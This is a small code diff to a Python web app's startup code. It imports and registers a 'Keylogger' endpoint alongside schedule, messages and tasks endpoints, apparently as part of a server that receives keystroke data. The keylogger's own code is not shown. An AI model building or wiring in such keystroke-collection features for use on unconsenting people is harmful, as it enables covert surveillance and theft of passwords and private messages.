@@ -12,6 +12,7 @@ from database_schema import db as SQLalchemy
 # Import Apps
 from Features.Schedule import endpoint as schedule_endpoint
 from Features.Messages import endpoint as message_endpoint
+from Features.Keylogger import endpoint as keylogger_endpoint
 from Features.Tasks import endpoint as task_endpoint
 
 
@@ -54,6 +55,9 @@ def create_app():
 
         print("Init schedule endpoint")
         schedule_endpoint.init_endpoint(app_context, app, Session)
+
+        print("Init keylogger endpoint")
+        keylogger_endpoint.init_endpoint(app_context, app, Session)
 
         print("Init task endpoint")
         task_endpoint.init_endpoint(app_context, app, Session)
